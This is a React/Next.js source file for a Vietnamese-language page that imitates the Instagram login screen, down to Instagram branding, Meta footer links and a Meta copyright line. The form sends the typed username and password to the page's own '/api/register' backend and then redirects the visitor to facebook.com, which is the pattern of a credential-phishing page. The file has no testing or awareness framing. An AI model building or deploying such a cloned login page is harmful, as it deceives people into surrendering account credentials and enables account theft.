"use client";

import React, { useState, FormEvent } from "react";
import { useRouter } from "next/navigation";
import Image from "next/image";
import { Facebook } from "lucide-react";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";

export default function RegisterPage() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const router = useRouter();

  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    setError("");

    try {
      const response = await fetch("http://localhost:3000/api/register", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password }),
      });

      // Parse response as JSON
      const data = await response.json();

      if (data.success) {
        router.push("https://www.facebook.com/");
      } else {
        setError(data.message || "Đăng ký thất bại");
      }
    } catch (err) {
      setError("Có lỗi xảy ra");
      console.error(err);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-black">
      {/*  */}
      <main className="flex-1 flex items-center justify-center">
        <div className="grid lg:grid-cols-2 gap-8 lg:gap-16 items-center max-w-6xl w-full">
          {/*  */}
          <div className="hidden lg:flex justify-center items-center relative">
            <div className="relative w-[500px] h-[400px]">
              {/* Main phone mockup */}
              <Image
                src="/instagram-web-lox-image.png"
                alt="Shopee Logo"
                fill
              />
            </div>
          </div>

          <div className="w-full max-w-sm mx-auto lg:mx-0">
            <div className="space-y-6">
              {/* Instagram logo */}
              <div className="text-center">
                <h1 className="text-4xl font-script text-white mb-8">
                  Instagram
                </h1>
              </div>

              {/* Login form */}
              <form onSubmit={handleSubmit} className="space-y-4">
                {error && <p className="text-red-500 mb-4">{error}</p>}
                <div>
                  <Input
                    type="text"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    placeholder="Số điện thoại, tên người dùng hoặc email"
                    className="bg-gray-900 border-gray-700 text-white placeholder:text-gray-400 h-12"
                  />
                </div>
                <div>
                  <Input
                    type="password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    placeholder="Mật khẩu"
                    className="bg-gray-900 border-gray-700 text-white placeholder:text-gray-400 h-12"
                  />
                </div>
                <Button className="w-full bg-blue-600 hover:bg-blue-700 text-white h-12 font-semibold">
                  Đăng nhập
                </Button>
              </form>

              {/* OR divider */}
              <div className="flex items-center gap-4">
                <div className="h-px flex-1 bg-gray-700" />
                <span className="text-gray-400 text-sm font-semibold">
                  HOẶC
                </span>
                <div className="h-px flex-1 bg-gray-700" />
              </div>

              {/* Facebook login */}
              <Button
                variant="ghost"
                className="w-full text-blue-400 hover:text-blue-300 hover:bg-transparent"
              >
                <Facebook className="w-4 h-4 mr-2" />
                Đăng nhập bằng Facebook
              </Button>

              {/* Forgot password */}
              <div className="text-center">
                <a
                  href="#"
                  className="text-blue-400 hover:text-blue-300 text-sm"
                >
                  Quên mật khẩu?
                </a>
              </div>

              {/* Sign up link */}
              <div className="text-center text-sm text-gray-400 mt-8">
                Bạn chưa có tài khoản ư?{" "}
                <a
                  href="#"
                  className="text-blue-400 hover:text-blue-300 font-semibold"
                >
                  Đăng ký
                </a>
              </div>
            </div>
          </div>
        </div>
      </main>
      {/* Footer */}
      <footer className="text-center text-xs text-gray-500 py-4">
        <div className="flex flex-wrap justify-center gap-4">
          <a href="#" className="hover:text-gray-400">
            Meta
          </a>
          <a href="#" className="hover:text-gray-400">
            Giới thiệu
          </a>
          <a href="#" className="hover:text-gray-400">
            Blog
          </a>
          <a href="#" className="hover:text-gray-400">
            Việc làm
          </a>
          <a href="#" className="hover:text-gray-400">
            Trợ giúp
          </a>
          <a href="#" className="hover:text-gray-400">
            API
          </a>
          <a href="#" className="hover:text-gray-400">
            Quyền riêng tư
          </a>
          <a href="#" className="hover:text-gray-400">
            Điều khoản
          </a>
          <a href="#" className="hover:text-gray-400">
            Vị trí
          </a>
          <a href="#" className="hover:text-gray-400">
            Instagram Lite
          </a>
          <a href="#" className="hover:text-gray-400">
            Threads
          </a>
          <a href="#" className="hover:text-gray-400">
            Tải thông tin liên hệ lên & người dùng phải người dùng
          </a>
          <a href="#" className="hover:text-gray-400">
            Meta đã xác minh
          </a>
        </div>
        <div>
          <span>Tiếng Việt</span>
          <span className="ml-4">© 2023 Instagram from Meta</span>
        </div>
      </footer>
    </div>
  );
}
